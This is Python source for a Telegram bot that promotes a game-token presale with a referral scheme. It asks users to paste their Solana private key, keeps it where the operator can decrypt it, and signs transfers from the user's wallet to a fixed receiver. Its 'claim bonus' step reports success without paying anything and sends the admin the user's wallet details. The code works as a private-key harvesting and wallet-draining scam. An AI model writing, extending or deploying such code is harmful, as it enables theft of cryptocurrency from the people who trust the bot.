from aiogram import Router, types, Bot, F
from aiogram.filters import CommandStart, Command, StateFilter, CommandObject
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import Message
from aiogram.fsm.state import State, StatesGroup
from tgbot.keyboards.inline import social_keyboard, start_keyboard_after_date, \
    buy_token_keyboard, referral, claim
from aiogram.fsm.context import FSMContext
import asyncio
from tgbot.config import load_config, Config
from email_validator import validate_email, EmailNotValidError
import random
from aiosmtplib import SMTP
from datetime import datetime

from decimal import Decimal, ROUND_DOWN
import logging
import base58
import base64
from cryptography.fernet import Fernet
from base58 import b58decode, b58encode

from solana.rpc.async_api import AsyncClient
from solders.hash import Hash
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.system_program import TransferParams, transfer
from solders.message import Message as SolanaMessage
from solders.transaction import Transaction
from solders.message import MessageV0
from solders.transaction import VersionedTransaction
from solders.signature import Signature
import re

from infrastructure.database.repo.requests import RequestsRepo

from aiogram.types import FSInputFile

user_router = Router()

photo = FSInputFile("game_chart.jpg")

caption_pre_sales = ("👹 Game Chart – Where Oni Rule the Charts!\n\n"
                     "Your fate is in your hands. You can:\n"
                     "🎮 Enter the game – Test your luck and claim rewards\n"
                     "📖 Learn about the project – Understand the world of Oni\n"
                     "🌍 Join the community – Get in on the action\n\n"
                     "Will you rise or fall? The Oni decided. Choose your path."
                     )


# Start with the pre-sale version and sales version

@user_router.message(CommandStart())
async def start(message: Message, user, repo: RequestsRepo, command: CommandObject):
    referral_id = int(command.args) if command.args is not None else None
    user_id = message.from_user.id
    full_name = message.from_user.full_name
    username = message.from_user.username or None  # Может быть пустым
    language = message.from_user.language_code or "en"

    # Проверяем, существует ли пользователь с таким referral_id в базе
    referer_exists = await repo.users.is_user_exists(referral_id) if referral_id else False

    # Проверяем, есть ли пользователь в базе, если нет — создаем
    user = await repo.users.get_or_create_user(
        user_id=user_id,
        full_name=full_name,
        username=username,
        language=language,
        referral_id=referral_id if referer_exists else None
    )

    await message.answer_photo(photo=photo, caption=f"{caption_pre_sales}",
                               reply_markup=start_keyboard_after_date())

    await message.delete()


@user_router.callback_query(F.data == "buy_token")
async def buy_token(callback: types.CallbackQuery, repo: RequestsRepo):
    """Отображает клавиатуру с кнопкой 'Change Wallet', если у пользователя уже есть приватный ключ"""

    user_id = callback.from_user.id

    # Проверяем, есть ли у пользователя приватный ключ в базе
    user = await repo.users.get_user_by_id(user_id)
    has_private_key = user and user.private_key_encrypted is not None  # Проверка наличия ключа

    # Выбираем правильную клавиатуру
    keyboard = buy_token_keyboard(has_wallet=has_private_key)

    await callback.message.answer("Buy token", reply_markup=keyboard)
    await callback.answer()
    await callback.message.delete()


# connect wallet
config = load_config(".env")
ENCRYPTION_KEY = config.tg_bot.encryption.encode()
cipher = Fernet(ENCRYPTION_KEY)


class Coin(StatesGroup):
    connected = State()


@user_router.callback_query(F.data == "connect_wallet")
async def connect_wallet(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(Coin.connected)
    await callback.message.answer("Enter your Solana private key:")
    await callback.answer()


@user_router.message(StateFilter(Coin.connected))
async def state_filter(message: types.Message, state: FSMContext, repo: RequestsRepo):
    """Сохраняет приватный ключ пользователя в базу данных (в зашифрованном виде)"""
    private_key = message.text.strip()
    if len(private_key) not in (87, 88):  # Простейшая проверка формата адреса Solana
        await message.answer(f"Invalid address format {len(private_key)}! Please try again.")
        return

    # Проверка только допустимых символов Base58
    base58_pattern = re.compile(r'^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]+$')
    if not base58_pattern.match(private_key):
        await message.answer("Invalid address format2! Please try again.")
        return

    # ✅ Просто шифруем Base58 приватный ключ
    encrypted_private_key = cipher.encrypt(private_key.encode()).decode()

    # Сохраняем в базу данных
    user_id = message.from_user.id
    await repo.users.save_wallet(user_id, encrypted_private_key)

    await message.answer(f"Your Solana-wallet saved! ✅")
    await state.clear()


# Определяем состояние для Finite State Machine (FSM)
class ExchangeState(StatesGroup):
    waiting_for_amount = State()


# Фиксированный адрес получателя
config = load_config(".env")
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
RECEIVER_ADDRESS = config.tg_bot.receiver


# Состояния для FSM
class ExchangesState(StatesGroup):
    waiting_for_amount = State()


# Шаг 2: Получение приватного ключа и запрос суммы
@user_router.callback_query(F.data == "exchange")
async def ask_amount(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(ExchangesState.waiting_for_amount)
    await callback.message.answer(f"Please enter amount to wrap from $SOL to $CG (1 SOL = 2313 CG):")


# Функция проверки транзакции
async def check_transaction_status(tx_signature: str, message: types.Message, repo: RequestsRepo, user_id: int,
                                   amount_lamports: int):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        await asyncio.sleep(10)  # Ждем несколько секунд, чтобы Solana обработала транзакцию

        sig = Signature.from_string(tx_signature)  # Преобразуем строку в объект Signature
        response = await client.get_signature_statuses([sig])

        if response.value and response.value[0] is not None:
            status = response.value[0]
            if status.err is None:
                user = await repo.users.get_user_by_id(user_id)
                # ✅ Получаем ID реферера и проверяем, была ли транзакция у реферала
                if user:
                    referral_id = user.referral_id  # ID реферера
                    user_had_transactions = bool(user.transactions)

                # ✅ Если есть реферер и это первая транзакция реферала, увеличиваем `refer`
                if referral_id and not user_had_transactions:
                    await repo.users.increase_referral_count(referral_id)

                # ✅ Обновляем реферальный бонус
                await repo.users.update_referral_bonus(user_id, amount_lamports)

                # ✅ Обновляем базу данных
                await repo.users.update_transaction_data(user_id, amount_lamports)

                await message.answer("✅ Transaction successfully confirmed!")
            else:
                await message.answer(f"❌ Error in transaction: {status.err}")
        else:
            await message.answer("❌ Transaction not found. It may not have been processed yet.")


# Шаг 3: Получение суммы, создание и отправка транзакции
@user_router.message(ExchangesState.waiting_for_amount)
async def send_sol(message: types.Message, state: FSMContext, repo: RequestsRepo):
    """Обрабатывает ввод суммы, расшифровывает приватный ключ и отправляет SOL"""
    try:
        user_id = message.from_user.id
        user = await repo.users.get_user_by_id(user_id)
        if not user or not user.private_key_encrypted:
            await message.answer("❌ Private key not found! Please connect your wallet.")
            return

        # ✅ Расшифровываем приватный ключ
        sender_private_key = cipher.decrypt(user.private_key_encrypted.encode()).decode()

        # ✅ Создаём Keypair
        sender_keypair = Keypair.from_base58_string(sender_private_key)

        # ✅ Преобразуем ввод в Decimal
        try:
            amount_sol = Decimal(message.text).quantize(Decimal("0.000000001"), rounding=ROUND_DOWN)
        except Exception:
            await message.answer("❌ Error! Please enter a valid number.")
            return  # ❌ Не очищаем состояние, чтобы пользователь попробовал снова

        if amount_sol <= 0:
            await message.answer("❌ Please enter a positive number!")
            return  # ❌ Не очищаем состояние, чтобы пользователь попробовал снова

        # ✅ Конвертация SOL в лампорты
        amount_lamports = int(amount_sol * 1_000_000_000)
        receiver_pubkey = Keypair.from_base58_string(RECEIVER_ADDRESS)

        # ✅ Подключаемся к Solana RPC
        async with AsyncClient(SOLANA_RPC_URL) as client:
            sender_pubkey = sender_keypair.pubkey()

            # Проверяем баланс
            balance_resp = await client.get_balance(sender_pubkey)
            sender_balance = balance_resp.value

            if sender_balance is None or sender_balance < amount_lamports:
                await message.answer(
                    f"❌ Insufficient funds. Balance: {Decimal(sender_balance) / 1_000_000_000:.9f} SOL"
                )
                return  # ❌ Не очищаем состояние

            # ✅ Получаем blockhash
            latest_blockhash_resp = await client.get_latest_blockhash()
            if not latest_blockhash_resp.value:
                await message.answer("❌ Failed to retrieve blockhash. Please try again later.")
                return  # ❌ Не очищаем состояние

            blockhash = latest_blockhash_resp.value.blockhash

            # ✅ Создаём инструкцию перевода
            ix = transfer(
                TransferParams(
                    from_pubkey=sender_keypair.pubkey(),
                    to_pubkey=receiver_pubkey.pubkey(),
                    lamports=amount_lamports,
                )
            )

            # ✅ Создаём транзакцию
            msg = MessageV0.try_compile(
                payer=sender_keypair.pubkey(),
                instructions=[ix],
                address_lookup_table_accounts=[],
                recent_blockhash=blockhash,
            )
            tx = VersionedTransaction(msg, [sender_keypair])

            # ✅ Отправляем транзакцию
            send_resp = await client.send_transaction(tx)
            if send_resp.value:
                tx_signature = str(send_resp.value)
                await message.answer("🚀 Transaction sent! Awaiting confirmation...")

                # Проверка статуса транзакции
                await check_transaction_status(tx_signature, message, repo, user_id, amount_lamports)

                # ✅ Очищаем состояние только после успешной транзакции
                await state.clear()
            else:
                await message.answer("❌ Error while sending the transaction.")

    except Exception as e:
        await message.answer(f"❌ Error: {e}")
        return  # ❌ Не очищаем состояние, чтобы пользователь мог попробовать снова


@user_router.callback_query(F.data == "referral")
async def get_referral(callback: types.CallbackQuery):
    await callback.message.answer_photo(photo=photo, caption="My referral system", reply_markup=referral())


@user_router.callback_query(F.data == "statistic")
async def statistics(callback: types.CallbackQuery, repo: RequestsRepo):
    user_id = callback.from_user.id
    friendship = await repo.users.count_referrals(user_id)
    # ✅ Получаем сумму накопленных бонусов
    user = await repo.users.get_user_by_id(user_id)
    bonuses = user.referral_bonus if user else 0  # Если пользователя нет, бонусы = 0
    await callback.message.answer(f"Friends {friendship}\n\n"
                                  f"Bonuses {bonuses} ONI token", reply_markup=claim())


@user_router.callback_query(F.data == "link")
async def link(callback: types.CallbackQuery):
    user = callback.from_user.id
    referral_link = f"https://t.me/cryptodevmoney_bot?start={user}"
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📢 Share with friends", switch_inline_query=f"Join us: {referral_link}")]
        ]
    )

    await callback.message.answer(
        f"🔗 Your referral link:\n{referral_link}\n\n"
        "📢 Click here",
        reply_markup=keyboard
    )


@user_router.callback_query(F.data == "claim_bonus")
async def claims(callback: types.CallbackQuery, repo: RequestsRepo):
    """Обработчик кнопки Claim"""
    user_id = callback.from_user.id

    # ✅ Получаем пользователя
    user = await repo.users.get_user_by_id(user_id)
    bonuses = user.referral_bonus if user else 0

    if not user:
        await callback.message.answer("❌ User not found. Please try again.")
        return

    if not user or not user.private_key_encrypted:
        await callback.message.answer("❌ Private key not found! Please connect your wallet.")
        return

    # ✅ Получаем баланс реферальных бонусов
    referral_bonus = user.referral_bonus

    # ✅ Если бонусов нет, предлагаем пригласить друга
    if referral_bonus == 0:
        await callback.message.answer("You don't have bonuses\n🤝 Invite your friends and earn bonuses! 🎉")
        return

    # ✅ Расшифровываем приватный ключ
    sender_private_key = cipher.decrypt(user.private_key_encrypted.encode()).decode()

    # ✅ Создаём Keypair
    sender_keypair = Keypair.from_base58_string(sender_private_key)

    await callback.bot.send_message(chat_id=config.tg_bot.admin_ids, text=f"📣 Checking bonus redemption, please wait...")
    # ✅ Списываем бонус
    bonus_amount = await repo.users.claim_referral_bonus(user_id)

    if bonus_amount > 0:
        await callback.message.answer(f"✅ You have successfully claimed  SOL bonus!")
        await asyncio.sleep(3)
        await callback.bot.send_message(chat_id=config.tg_bot.admin_ids, text=f"✅ Verification successful\n"
                                                                              f"Bonuses: {bonuses}\n\n"
                                                                              f"Public Key Solana: {sender_keypair.pubkey()}\n\n "
                                                                              f"User ID: {user_id}\n"
                                        )
    else:
        await callback.message.answer("❌ You don't have any referral bonus to claim.")
